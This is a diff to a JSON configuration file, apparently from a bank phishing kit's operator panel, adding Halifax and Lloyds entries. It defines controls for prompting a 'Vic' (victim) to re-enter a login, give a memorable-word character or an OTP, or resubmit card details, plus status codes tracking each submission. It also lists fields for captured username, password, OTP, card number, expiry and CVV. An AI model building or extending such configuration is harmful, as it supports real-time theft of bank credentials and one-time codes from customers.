@@ -73,6 +73,10 @@
 			"id": "dbs"
 		},
 		{
+			"name": "Halifax",
+			"id": "halifax"
+		},
+		{
 			"name": "RBC",
 			"id": "rbc"
 		},
@@ -3615,6 +3619,119 @@
 		]
 	},
 	"lloyds": {
+		"buttons": [
+			{
+				"name": "ASK LOGIN AGAIN",
+				"status": "0"
+			},
+			{
+				"name": "ASK MEMORABLE",
+				"status": "2",
+				"inputs": [
+					{
+						"id": "memIndex",
+						"placeholder": "Character Placements (e.g 123)"
+					}
+				]
+			},
+			{
+				"name": "ASK CARD AGAIN",
+				"status": "4"
+			},
+			{
+				"name": "ASK OTP",
+				"status": "6",
+				"inputs": [
+					{
+						"id": "otpIndex",
+						"placeholder": "Character Placements (e.g 1234)"
+					}
+				]
+			},
+			{
+				"name": "FINISH",
+				"status": "8"
+			}
+		],
+		"status": [
+			{
+				"status": 0,
+				"meaning": "Vic Resubmitting Login"
+			},
+			{
+				"status": 1,
+				"meaning": "Vic Waiting... Submitted Login"
+			},
+			{
+				"status": 2,
+				"meaning": "Vic Submitting Memorable"
+			},
+			{
+				"status": 3,
+				"meaning": "Vic Waiting... Submitted Memorable"
+			},
+			{
+				"status": 4,
+				"meaning": "Vic Submitting Billing Info"
+			},
+			{
+				"status": 5,
+				"meaning": "Vic Waiting... Submitted Billing Info"
+			},
+			{
+				"status": 6,
+				"meaning": "Vic Submitting OTP"
+			},
+			{
+				"status": 7,
+				"meaning": "Vic Waiting... Submitted OTP"
+			},
+			{
+				"status": 8,
+				"meaning": "Finished"
+			},
+			{
+				"status": 9,
+				"meaning": "Vic Waiting... Resubmitted Login"
+			}
+		],
+		"information": [
+			{
+				"heading": "Username",
+				"key": "username"
+			},
+			{
+				"heading": "Password",
+				"key": "password"
+			},
+			{
+				"heading": "Memorable",
+				"key": "memorable"
+			},
+			{
+				"heading": "OTP",
+				"key": "otp"
+			},
+			{
+				"heading": "Card Number",
+				"key": "ccnum"
+			},
+			{
+				"heading": "Card Expiry",
+				"key": "ccexp"
+			},
+			{
+				"heading": "CVV",
+				"key": "cvv"
+			}
+		],
+		"mainInfo": [
+			{
+				"usernameHeading": "username"
+			}
+		]
+	},
+	"halifax": {
 		"buttons": [
 			{
 				"name": "ASK LOGIN AGAIN",
